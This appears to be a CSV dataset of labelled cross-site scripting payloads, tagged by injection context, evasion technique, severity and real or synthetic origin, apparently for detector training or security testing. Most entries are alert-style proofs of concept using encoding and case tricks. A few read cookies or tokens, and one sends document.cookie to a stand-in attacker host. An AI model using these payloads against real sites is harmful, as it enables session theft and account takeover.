payload,context,technique,severity,length,source
#s&#101;t($x='&#97;l&#101;rt('XSS')')$x,template_injection,synthetic,low,39,synthetic
%27><script>console.log(%27XSS%27)</script>,script_injection,synthetic,medium,43,synthetic
%27><img src=x ondrop=alert(%27XSS%27)>,attribute_escape,synthetic,medium,39,synthetic
<legend onpointerout=alert(1) style=display:block>AnonKryptiQuz</legend>,tag_injection,none,medium,72,real
<frame onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</frame>,tag_injection,none,medium,76,real
<marquee onkeydown=confirm(1)>,tag_injection,synthetic,medium,30,synthetic
"' %3E%3Csvg onpopstate=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,64,synthetic
"<summary draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,72,real
"""><Img srC=x onErrOr=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
<table x=y oninvalid=prompt('XSS')>,tag_injection,synthetic,medium,35,synthetic
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",generic,encoding,high,57,real
"<div draggable=""true"" contenteditable>drag me</div><img2 ondrop=alert(1) contenteditable style=display:block>drop here</img2>",tag_injection,none,medium,125,real
"<script>Function('prompt(String.fromCharCode(88,83,83))')();</script>",script_injection,synthetic,high,69,synthetic
' ><svg onpopstate=\u0061lert('XSS')>,attribute_escape,synthetic,low,37,synthetic
"""`'><script>\xEF\xBB\xBFjavascript:alert(8282)</script>",script_injection,none,medium,55,real
"' oNcaNplAy=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape,synthetic,high,56,synthetic
' ><svg onmous&#101;ov&#101;r=confirm('XSS')>,attribute_escape,synthetic,medium,45,synthetic
'><img src=x onwh&#101;&#101;l=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,61,synthetic
<button popovertarget=x>Click me</button><iframe onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</iframe>,tag_injection,none,medium,108,real
\' OnpLayIng=alErt(loCatIon.haSh)//,attribute_escape,synthetic,medium,35,synthetic
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onwebkitanimationend=""alert(1)""></summary>",tag_injection,none,medium,105,real
' ><svg ongotpoint&#101;rc&#97;ptur&#101;=prompt('XSS')>,attribute_escape,synthetic,medium,56,synthetic
' ><svG oNenDed=prOmpT('XSS')>,attribute_escape,synthetic,medium,30,synthetic
JavAscRipT:pRomPt/**/(loCatIon.haSh),js_uri,synthetic,low,36,synthetic
"\' OncLosE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,55,synthetic
{% AleRt DocUmeNt.CooKie %},template_injection,synthetic,high,27,synthetic
"' ><svG oNpaGesWap=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>,tag_injection,none,medium,64,real
'><img src=x onwebkitanimationend=confirm('XSS')>,attribute_escape,synthetic,medium,49,synthetic
<scRipT>pRomPt`LocAtiOn.HasH`</scRipT>,script_injection,synthetic,low,38,synthetic
"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></menuitem>",tag_injection,none,medium,176,real
"&quot; ongotpointercapture=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,74,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onk&#101;ydown"":&#101;v&#97;l})",dom_sink,synthetic,low,63,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,medium,117,synthetic
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>AnonKryptiQuz</style>,tag_injection,none,medium,100,real
"<frameset onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",tag_injection,none,medium,75,real
%3Cimage onchange=alert(1) onchange=alert(1)%3E,tag_injection,synthetic,medium,47,synthetic
"<iframe2 draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",tag_injection,none,medium,92,real
%3Clisting/onpopstate=prompt(document.domain)%3E,tag_injection,synthetic,medium,48,synthetic
&quOt; onCut=coNfiRm(1) X=&QuoT;,attribute_escape,synthetic,medium,32,synthetic
%22 ><svg onpointerup=alert(1)>,attribute_escape,synthetic,medium,31,synthetic
"<head oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</head>",tag_injection,none,medium,71,real
%22 onbeforetoggle=confirm(location.hash) %22,attribute_escape,synthetic,medium,45,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT(dOcuMenT.dOmaIn)>""",dom_sink,synthetic,high,68,synthetic
JavAscRipT:cOnsOle.loG/**/(DocUmeNt.DomAin),js_uri,synthetic,low,43,synthetic
"javascript:""/*`/*\""/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script>",script_injection,comment_injection|case_variation,medium,142,real
"<strong onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</strong>",tag_injection,none,medium,88,real
\' oncut=alert('XSS')//,attribute_escape,synthetic,medium,23,synthetic
<scr	ipt onclick=prompt('XSS')/>,tag_injection,synthetic,medium,32,synthetic
<sourc&#101; src=x oninput=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,65,synthetic
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>",tag_injection,none,medium,95,real
onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,84,synthetic
"""><img src=x onmous&#101;ov&#101;r=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,59,synthetic
"<command draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</command>",tag_injection,none,medium,72,real
"<input onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</input>",tag_injection,none,medium,70,real
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",generic,html_entity,medium,53,real
<button popovertarget=x>Click me</button><header ontoggle=alert(1) popover id=x>AnonKryptiQuz</header>,tag_injection,none,medium,102,real
\' onhashchange=confirm(document.domain)//,attribute_escape,synthetic,medium,42,synthetic
"<dt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,85,real
"\' onvolumechange=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,61,synthetic
%27><img src=x onmousedown=alert(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
"<legend oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",tag_injection,none,medium,64,real
"setInterval(%22eval(%27XSS%27)%22,100)",dom_sink,synthetic,high,38,synthetic
<td	onKeyUp=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,37,synthetic
"<s draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</s>",tag_injection,none,medium,79,real
"<small onmouseout=""alert(1)"">AnonKryptiQuz</small>",tag_injection,none,medium,50,real
""" oNmoUseUp=ProMpt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,37,synthetic
j&#97;v&#97;	script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,57,synthetic
"<details onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</details>",tag_injection,none,medium,69,real
"<svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",attribute_escape,none,low,67,real
"<arEa OneNdeD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,52,synthetic
"s&#101;tTim&#101;out(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",0)",dom_sink,synthetic,low,98,synthetic
"&quot; onpopstate=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,65,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=eval('//attacker.com/?c='+document.cookie)%3E""",dom_sink,synthetic,high,92,synthetic
"\"" OntOggLe=ConFirM('XSS')//",attribute_escape,synthetic,medium,28,synthetic
%3Cmeta onpointerover=confirm(1) onpointerover=confirm(1)%3E,tag_injection,synthetic,medium,60,synthetic
<link onpointerover=alert(1) style=display:block>AnonKryptiQuz</link>,tag_injection,none,medium,69,real
"setTimeout(%22XMLHttpRequest(document.cookie)%22,0)",dom_sink,synthetic,high,51,synthetic
 onwebkitanimationend=\u0061lert(1),event_handler,synthetic,low,35,synthetic
"<anImaTemOtiOn
OndBlcLicK=cOnsOle.loG(1)>",tag_injection,synthetic,medium,41,synthetic
onkeypress=javascr	ipt:prompt(1),event_handler,synthetic,medium,32,synthetic
"data:text/html,<scr	ipt>prompt(1)</scr	ipt>",js_uri,synthetic,medium,43,synthetic
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,tag_injection,none,medium,57,real
`><img src=x onblur=alert(location.hash)>,attribute_escape,synthetic,medium,41,synthetic
"\"" onpopstate=\u0061lert(document.domain)//",attribute_escape,synthetic,low,43,synthetic
`><img src=x onwebkitfullscreenchange=alert('XSS')>,attribute_escape,synthetic,medium,51,synthetic
"<dfn onmouseenter=""alert(1)"">AnonKryptiQuz</dfn>",tag_injection,none,medium,48,real
' ondrop=\u0061lert('XSS') ',attribute_escape,synthetic,low,28,synthetic
onrepeat=alert('XSS'),event_handler,synthetic,medium,21,synthetic
<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>,tag_injection,none,medium,70,real
"setTimeout(""prompt(localStorage.getItem('token'))"",0)",dom_sink,synthetic,high,53,synthetic
<base	oninvalid=confirm(location.hash)>,tag_injection,synthetic,medium,39,synthetic
%27><img src=x onbeforecut=alert(document.domain)>,attribute_escape,synthetic,medium,50,synthetic
'><Img srC=x onInvAliD=cOnfIrm(1)>,attribute_escape,synthetic,medium,34,synthetic
"%22><video onpaste=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
<teMplAte onConTexTmeNu=ConSolE.lOg(1) OncOntExtMenU=cOnsOle.loG(1)>,tag_injection,synthetic,medium,68,synthetic
<diAloG oNplAy=ProMpt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",tag_injection,none,medium,115,real
"javascript:/*""/*`/*'/*\""/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame onload=alert()>",script_injection,comment_injection,medium,152,real
""" ><svG oNtoUchEnd=coNfiRm('XSS')>",attribute_escape,synthetic,medium,34,synthetic
	onMouSeeNteR=aLerT(lOcaTioN.hAsh),event_handler,synthetic,medium,34,synthetic
